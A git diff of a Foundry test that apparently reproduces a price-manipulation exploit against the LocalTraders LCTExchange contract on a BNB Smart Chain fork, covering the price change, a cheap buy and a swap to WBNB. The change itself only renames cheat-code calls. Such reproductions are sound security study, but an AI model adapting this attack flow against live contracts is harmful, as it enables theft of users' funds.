@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @TX's:
 // 1. https://bscscan.com/tx/0x57b589f631f8ff20e2a89a649c4ec2e35be72eaecf155fdfde981c0fec2be5ba
@@ -27,15 +26,13 @@ contract LocalTraders is Test {
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     address public upgradeableProxy = 0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("bsc", 28_460_897);
-        cheats.label(address(LCTExchange), "LCTExchange");
-        cheats.label(address(Router), "Router");
-        cheats.label(address(LCT), "LCT");
-        cheats.label(address(WBNB), "WBNB");
-        cheats.label(upgradeableProxy, "Proxy");
+        vm.createSelectFork("bsc", 28_460_897);
+        vm.label(address(LCTExchange), "LCTExchange");
+        vm.label(address(Router), "Router");
+        vm.label(address(LCT), "LCT");
+        vm.label(address(WBNB), "WBNB");
+        vm.label(upgradeableProxy, "Proxy");
     }
 
     function testAccess() public {
@@ -58,7 +55,7 @@ contract LocalTraders is Test {
 
         // 2.Changing token price in vulnerable contract
 
-        cheats.roll(28_460_898);
+        vm.roll(28_460_898);
         uint256 uintInSlot3Before = getValFromSlot3();
         emit log_named_uint("[2] Uint value (token price) in slot 3 before second call", uintInSlot3Before);
 
@@ -73,7 +70,7 @@ contract LocalTraders is Test {
 
         // 3.Buying LCT
 
-        cheats.roll(28_460_899);
+        vm.roll(28_460_899);
         uint256 payableAmount = (LCT.balanceOf(address(LCTExchange)) / 1 ether) - 1;
 
         LCTExchange.buyTokens{value: payableAmount}();
@@ -82,7 +79,7 @@ contract LocalTraders is Test {
 
         // 4.Swap to WBNB
 
-        cheats.roll(28_461_207);
+        vm.roll(28_461_207);
         LCT.approve(address(Router), type(uint256).max);
         address[] memory path = new address[](2);
         path[0] = address(LCT);
@@ -97,12 +94,12 @@ contract LocalTraders is Test {
     }
 
     function getValFromSlot0() internal returns (address) {
-        bytes32 valInslot0 = cheats.load(upgradeableProxy, bytes32(uint256(0)));
+        bytes32 valInslot0 = vm.load(upgradeableProxy, bytes32(uint256(0)));
         return address(uint160(uint256(valInslot0)));
     }
 
     function getValFromSlot3() internal returns (uint256) {
-        bytes32 valInslot3 = cheats.load(upgradeableProxy, bytes32(uint256(3)));
+        bytes32 valInslot3 = vm.load(upgradeableProxy, bytes32(uint256(3)));
         return uint256(valInslot3);
     }
 
